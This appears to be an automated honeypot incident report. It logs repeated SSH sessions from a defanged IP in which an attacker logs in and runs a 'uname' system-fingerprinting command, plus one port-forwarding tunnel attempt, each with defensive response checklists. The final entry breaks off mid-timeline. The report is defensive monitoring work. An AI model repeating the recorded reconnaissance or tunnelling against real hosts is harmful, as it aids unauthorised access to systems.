| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:19` | `cowrie.session.connect` |
| `2026-07-30 16:46:19` | `cowrie.client.version` |
| `2026-07-30 16:46:19` | `cowrie.client.kex` |
| `2026-07-30 16:46:20` | `cowrie.login.success` |
| `2026-07-30 16:46:20` | `cowrie.session.params` |
| `2026-07-30 16:46:20` | `cowrie.command.input` |
| `2026-07-30 16:46:21` | `cowrie.log.closed` |
| `2026-07-30 16:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-611239314a28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:24` | `cowrie.session.connect` |
| `2026-07-30 16:46:24` | `cowrie.client.version` |
| `2026-07-30 16:46:24` | `cowrie.client.kex` |
| `2026-07-30 16:46:25` | `cowrie.login.success` |
| `2026-07-30 16:46:26` | `cowrie.session.params` |
| `2026-07-30 16:46:26` | `cowrie.command.input` |
| `2026-07-30 16:46:26` | `cowrie.log.closed` |
| `2026-07-30 16:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dd5cf5d37e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:30` | `cowrie.session.connect` |
| `2026-07-30 16:46:30` | `cowrie.client.version` |
| `2026-07-30 16:46:30` | `cowrie.client.kex` |
| `2026-07-30 16:46:30` | `cowrie.login.success` |
| `2026-07-30 16:46:31` | `cowrie.session.params` |
| `2026-07-30 16:46:31` | `cowrie.command.input` |
| `2026-07-30 16:46:31` | `cowrie.log.closed` |
| `2026-07-30 16:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de72fb97ee17

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:36` | `cowrie.session.connect` |
| `2026-07-30 16:46:36` | `cowrie.client.version` |
| `2026-07-30 16:46:36` | `cowrie.client.kex` |
| `2026-07-30 16:46:36` | `cowrie.login.success` |
| `2026-07-30 16:46:37` | `cowrie.session.params` |
| `2026-07-30 16:46:37` | `cowrie.command.input` |
| `2026-07-30 16:46:37` | `cowrie.log.closed` |
| `2026-07-30 16:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e482d8ace9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:41` | `cowrie.session.connect` |
| `2026-07-30 16:46:42` | `cowrie.client.version` |
| `2026-07-30 16:46:42` | `cowrie.client.kex` |
| `2026-07-30 16:46:42` | `cowrie.login.success` |
| `2026-07-30 16:46:43` | `cowrie.session.params` |
| `2026-07-30 16:46:43` | `cowrie.command.input` |
| `2026-07-30 16:46:43` | `cowrie.log.closed` |
| `2026-07-30 16:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e5b534c4be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:47` | `cowrie.session.connect` |
| `2026-07-30 16:46:47` | `cowrie.client.version` |
| `2026-07-30 16:46:47` | `cowrie.client.kex` |
| `2026-07-30 16:46:48` | `cowrie.login.success` |
| `2026-07-30 16:46:49` | `cowrie.session.params` |
| `2026-07-30 16:46:49` | `cowrie.command.input` |
| `2026-07-30 16:46:49` | `cowrie.log.closed` |
| `2026-07-30 16:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9441824c2063

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:53` | `cowrie.session.connect` |
| `2026-07-30 16:46:53` | `cowrie.client.version` |
| `2026-07-30 16:46:53` | `cowrie.client.kex` |
| `2026-07-30 16:46:54` | `cowrie.login.success` |
| `2026-07-30 16:46:56` | `cowrie.session.params` |
| `2026-07-30 16:46:56` | `cowrie.command.input` |
| `2026-07-30 16:46:56` | `cowrie.log.closed` |
| `2026-07-30 16:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751982deb392

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:59` | `cowrie.session.connect` |
| `2026-07-30 16:46:59` | `cowrie.client.version` |
| `2026-07-30 16:46:59` | `cowrie.client.kex` |
| `2026-07-30 16:46:59` | `cowrie.login.success` |
| `2026-07-30 16:47:00` | `cowrie.session.params` |
| `2026-07-30 16:47:00` | `cowrie.command.input` |
| `2026-07-30 16:47:00` | `cowrie.log.closed` |
| `2026-07-30 16:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c4473d6e5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:05` | `cowrie.session.connect` |
| `2026-07-30 16:47:05` | `cowrie.client.version` |
| `2026-07-30 16:47:05` | `cowrie.client.kex` |
| `2026-07-30 16:47:05` | `cowrie.login.success` |
| `2026-07-30 16:47:06` | `cowrie.session.params` |
| `2026-07-30 16:47:06` | `cowrie.command.input` |
| `2026-07-30 16:47:06` | `cowrie.log.closed` |
| `2026-07-30 16:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125f840f013a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:10` | `cowrie.session.connect` |
| `2026-07-30 16:47:10` | `cowrie.client.version` |
| `2026-07-30 16:47:10` | `cowrie.client.kex` |
| `2026-07-30 16:47:11` | `cowrie.login.success` |
| `2026-07-30 16:47:12` | `cowrie.session.params` |
| `2026-07-30 16:47:12` | `cowrie.command.input` |
| `2026-07-30 16:47:12` | `cowrie.log.closed` |
| `2026-07-30 16:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801e773c94cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:21` | `cowrie.session.connect` |
| `2026-07-30 16:47:21` | `cowrie.client.version` |
| `2026-07-30 16:47:21` | `cowrie.client.kex` |
| `2026-07-30 16:47:22` | `cowrie.login.success` |
| `2026-07-30 16:47:22` | `cowrie.session.params` |
| `2026-07-30 16:47:22` | `cowrie.command.input` |
| `2026-07-30 16:47:23` | `cowrie.log.closed` |
| `2026-07-30 16:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c93e9ee4c2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:27` | `cowrie.session.connect` |
| `2026-07-30 16:47:27` | `cowrie.client.version` |
| `2026-07-30 16:47:27` | `cowrie.client.kex` |
| `2026-07-30 16:47:28` | `cowrie.login.success` |
| `2026-07-30 16:47:28` | `cowrie.session.params` |
| `2026-07-30 16:47:28` | `cowrie.command.input` |
| `2026-07-30 16:47:29` | `cowrie.log.closed` |
| `2026-07-30 16:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b50a352c01

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:28` | `cowrie.session.connect` |
| `2026-07-30 16:47:29` | `cowrie.client.version` |
| `2026-07-30 16:47:29` | `cowrie.client.kex` |
| `2026-07-30 16:47:30` | `cowrie.login.success` |
| `2026-07-30 16:47:30` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0fc65e3e926

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:33` | `cowrie.session.connect` |
| `2026-07-30 16:47:33` | `cowrie.client.version` |
| `2026-07-30 16:47:33` | `cowrie.client.kex` |
| `2026-07-30 16:47:33` | `cowrie.login.success` |
| `2026-07-30 16:47:34` | `cowrie.session.params` |
| `2026-07-30 16:47:34` | `cowrie.command.input` |
| `2026-07-30 16:47:34` | `cowrie.log.closed` |
| `2026-07-30 16:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b9eac98460

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:38` | `cowrie.session.connect` |
| `2026-07-30 16:47:38` | `cowrie.client.version` |
| `2026-07-30 16:47:38` | `cowrie.client.kex` |
| `2026-07-30 16:47:39` | `cowrie.login.success` |
| `2026-07-30 16:47:40` | `cowrie.session.params` |
| `2026-07-30 16:47:40` | `cowrie.command.input` |
| `2026-07-30 16:47:40` | `cowrie.log.closed` |
| `2026-07-30 16:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4c8f09f6cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:44` | `cowrie.session.connect` |
| `2026-07-30 16:47:44` | `cowrie.client.version` |
| `2026-07-30 16:47:44` | `cowrie.client.kex` |
| `2026-07-30 16:47:44` | `cowrie.login.success` |
| `2026-07-30 16:47:45` | `cowrie.session.params` |
| `2026-07-30 16:47:45` | `cowrie.command.input` |
| `2026-07-30 16:47:46` | `cowrie.log.closed` |
| `2026-07-30 16:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa5cdbd9600

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:49` | `cowrie.session.connect` |
| `2026-07-30 16:47:49` | `cowrie.client.version` |
| `2026-07-30 16:47:49` | `cowrie.client.kex` |
| `2026-07-30 16:47:50` | `cowrie.login.success` |
| `2026-07-30 16:47:51` | `cowrie.session.params` |
| `2026-07-30 16:47:51` | `cowrie.command.input` |
| `2026-07-30 16:47:51` | `cowrie.log.closed` |
| `2026-07-30 16:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a171403fdb7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:47 |
| **Last Seen** | 2026-07-30 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:47:55` | `cowrie.session.connect` |
| `2026-07-30 16:47:55` | `cowrie.client.version` |
| `2026-07-30 16:47:55` | `cowrie.client.kex` |
| `2026-07-30 16:47:55` | `cowrie.login.success` |
| `2026-07-30 16:47:56` | `cowrie.session.params` |
| `2026-07-30 16:47:56` | `cowrie.command.input` |
| `2026-07-30 16:47:56` | `cowrie.log.closed` |
| `2026-07-30 16:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac158b6757e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:01` | `cowrie.session.connect` |
| `2026-07-30 16:48:01` | `cowrie.client.version` |
| `2026-07-30 16:48:01` | `cowrie.client.kex` |
| `2026-07-30 16:48:01` | `cowrie.login.success` |
| `2026-07-30 16:48:02` | `cowrie.session.params` |
| `2026-07-30 16:48:02` | `cowrie.command.input` |
| `2026-07-30 16:48:02` | `cowrie.log.closed` |
| `2026-07-30 16:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26955a3b469

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:06` | `cowrie.session.connect` |
| `2026-07-30 16:48:06` | `cowrie.client.version` |
| `2026-07-30 16:48:06` | `cowrie.client.kex` |
| `2026-07-30 16:48:07` | `cowrie.login.success` |
| `2026-07-30 16:48:08` | `cowrie.session.params` |
| `2026-07-30 16:48:08` | `cowrie.command.input` |
| `2026-07-30 16:48:08` | `cowrie.log.closed` |
| `2026-07-30 16:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd342add1793

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:12` | `cowrie.session.connect` |
| `2026-07-30 16:48:12` | `cowrie.client.version` |
| `2026-07-30 16:48:12` | `cowrie.client.kex` |
| `2026-07-30 16:48:13` | `cowrie.login.success` |
| `2026-07-30 16:48:14` | `cowrie.session.params` |
| `2026-07-30 16:48:14` | `cowrie.command.input` |
| `2026-07-30 16:48:14` | `cowrie.log.closed` |
| `2026-07-30 16:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87cffb22390f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:18` | `cowrie.session.connect` |
| `2026-07-30 16:48:18` | `cowrie.client.version` |
| `2026-07-30 16:48:18` | `cowrie.client.kex` |
| `2026-07-30 16:48:18` | `cowrie.login.success` |
| `2026-07-30 16:48:19` | `cowrie.session.params` |
| `2026-07-30 16:48:19` | `cowrie.command.input` |
| `2026-07-30 16:48:19` | `cowrie.log.closed` |
| `2026-07-30 16:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3ab8f4eba7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:23` | `cowrie.session.connect` |
| `2026-07-30 16:48:24` | `cowrie.client.version` |
| `2026-07-30 16:48:24` | `cowrie.client.kex` |
| `2026-07-30 16:48:24` | `cowrie.login.success` |
| `2026-07-30 16:48:25` | `cowrie.session.params` |
| `2026-07-30 16:48:25` | `cowrie.command.input` |
| `2026-07-30 16:48:25` | `cowrie.log.closed` |
| `2026-07-30 16:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a83a92f4e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:29` | `cowrie.session.connect` |
| `2026-07-30 16:48:29` | `cowrie.client.version` |
| `2026-07-30 16:48:29` | `cowrie.client.kex` |
| `2026-07-30 16:48:30` | `cowrie.login.success` |
| `2026-07-30 16:48:31` | `cowrie.session.params` |
| `2026-07-30 16:48:31` | `cowrie.command.input` |
| `2026-07-30 16:48:31` | `cowrie.log.closed` |
| `2026-07-30 16:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ad2d7e7254

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:35` | `cowrie.session.connect` |
| `2026-07-30 16:48:35` | `cowrie.client.version` |
| `2026-07-30 16:48:35` | `cowrie.client.kex` |
| `2026-07-30 16:48:35` | `cowrie.login.success` |
| `2026-07-30 16:48:36` | `cowrie.session.params` |
| `2026-07-30 16:48:36` | `cowrie.command.input` |
| `2026-07-30 16:48:36` | `cowrie.log.closed` |
| `2026-07-30 16:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152f584309b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:48 |
| **Last Seen** | 2026-07-30 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:48:40` | `cowrie.session.connect` |
| `2026-07-30 16:48:40` | `cowrie.client.version` |
| `2026-07-30 16:48:41` | `cowrie.client.kex` |
| `2026-07-30 16:48:41` | `cowrie.login.success` |
| `2026-07-30 16:48:42` | `cowrie.session.params` |
| `2026-07-30 16:48:42` | `cowrie.command.input` |
